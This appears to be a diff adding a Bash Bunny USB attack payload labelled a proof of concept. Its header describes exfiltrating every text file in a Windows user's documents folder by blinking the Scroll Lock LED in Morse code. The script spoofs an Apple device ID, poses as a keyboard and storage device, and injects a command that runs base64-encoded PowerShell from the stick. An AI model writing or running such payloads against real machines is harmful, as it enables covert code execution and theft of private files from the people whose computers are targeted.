@@ -1,0 +1,22 @@
+# Title:        Morse Code File Exfiltration
+# Description:  Reads all txt files in myDocs and Flashes the Scrolllock on and off to represent morse code  
+# Author:       Cribbit
+# Version:      1.2
+# Category:     PoC
+# Target:       Windows (Powershell 5.1+)
+# Attackmodes:	HID & STORAGE
+# Extensions:   Run
+# Notes:	Morse code only surports [0..9A..Z] so other char will be show as blanks	
+
+LED SETUP
+
+GET SWITCH_POSITION
+
+ATTACKMODE HID STORAGE VID_0X05AC PID_0X021E
+
+LED ATTACK
+
+QUACK DELAY 200
+RUN WIN "powershell .(powershell.exe -encodedCommand (gc((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\b.txt')))"
+
+LED FINISH
